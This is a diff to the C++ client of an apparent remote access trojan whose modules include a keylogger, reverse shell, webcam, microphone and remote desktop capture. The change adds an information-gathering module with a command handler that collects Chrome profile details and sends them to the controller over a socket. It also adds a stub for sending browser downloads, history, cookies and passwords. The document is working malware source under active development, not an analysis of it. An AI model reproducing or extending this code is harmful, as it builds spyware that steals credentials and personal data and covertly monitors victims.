@@ -5,7 +5,16 @@
 #include "mod_camara.hpp"
 #include "mod_remote_desktop.hpp"
 #include "mod_ventanas.hpp"
+#include "mod_info.hpp"
 #include "misc.hpp"
+
+template<typename OBJ>
+void DeleteObj(OBJ*& _obj) {
+    if (_obj) {
+        delete _obj;
+        _obj = nullptr;
+    }
+}
 
 extern Cliente* cCliente;
 
@@ -26,26 +35,22 @@ void Cliente::Init_Key() {
 void Cliente::DestroyClasses() {
     if (this->mod_RemoteDesk != nullptr) {
         this->mod_RemoteDesk->DetenerLive();
-        delete this->mod_RemoteDesk;
-        this->mod_RemoteDesk = nullptr;
+        DeleteObj<mod_RemoteDesktop>(this->mod_RemoteDesk);
     }
 
     if (this->mod_Mic != nullptr) {
         this->mod_Mic->m_DetenerLive();
-        delete this->mod_Mic;
-        this->mod_Mic = nullptr;
+        DeleteObj<Mod_Mic>(this->mod_Mic);
     }
 
     if (this->reverseSHELL != nullptr) {
         this->reverseSHELL->TerminarShell();
-        delete this->reverseSHELL;
-        this->reverseSHELL = nullptr;
+        DeleteObj<ReverseShell>(this->reverseSHELL);
     }
 
     if (this->mod_Key != nullptr) {
         this->mod_Key->Stop();
-        delete this->mod_Key;
-        this->mod_Key = nullptr;
+        DeleteObj<mod_Keylogger>(this->mod_Key);
     }
 
     if (this->mod_Cam != nullptr) {
@@ -55,13 +60,15 @@ void Cliente::DestroyClasses() {
                 this->mod_Cam->vcCamObjs[i].ReleaseCam();
             }
         }
-        delete this->mod_Cam;
-        this->mod_Cam = nullptr;
+        DeleteObj<mod_Camera>(this->mod_Cam);
     }
 
     if (this->mod_AdminVen != nullptr) {
-        delete this->mod_AdminVen;
-        this->mod_AdminVen = nullptr;
+        DeleteObj<mod_AdminVentanas>(this->mod_AdminVen);
+    }
+
+    if (this->mod_Inf0 != nullptr) {
+        DeleteObj<mod_Info>(this->mod_Inf0);
     }
 
     __DBG_("[DC] Clases destruidas");
@@ -805,6 +812,49 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             __DBG_("[RD] No se pudo parsear el paquete admin_ventanas");
         }
         
+        return;
+    }
+
+    //#####################################################
+    //#####################################################
+    //               RECOLECCION INFO                     # 
+    //Enviar lista de perfiles de chrome
+    if (iComando == EnumComandos::INF_Chrome_Profiles) {
+        if (this->mod_Inf0 == nullptr) {
+            this->mod_Inf0 = new mod_Info();
+        }
+        std::string strPaquete = "N/A";
+        std::vector<Chrome_Profile> vcProfiles = this->mod_Inf0->m_ChromeProfiles();
+        if (vcProfiles.size() > 0) {
+            strPaquete = "";
+            for (Chrome_Profile& profile : vcProfiles) {
+                strPaquete += profile.strPath;
+                strPaquete.append(1, '\'');
+                strPaquete += profile.strName;
+                strPaquete.append(1, '\'');
+                strPaquete += profile.strGaiaName;
+                strPaquete.append(1, '\'');
+                strPaquete += profile.strShortCutName;
+                strPaquete.append(1, '\'');
+                strPaquete += profile.strUserName;
+                strPaquete.append(1, '\'');
+                strPaquete += profile.strHostedDomain;
+                strPaquete.append(1, CMD_DEL);
+            }
+            strPaquete.pop_back();
+        }
+
+        this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::INF_Chrome_Profiles_Out);
+
+        return;
+    }
+
+    //Enviar datos de navegacion de perfil (descargas,historial,cookies,passwords)
+    if (iComando == EnumComandos::INF_Chrome_Profile_Data) {
+        if (this->mod_Inf0 == nullptr) {
+            this->mod_Inf0 = new mod_Info();
+        }
+
         return;
     }
 }
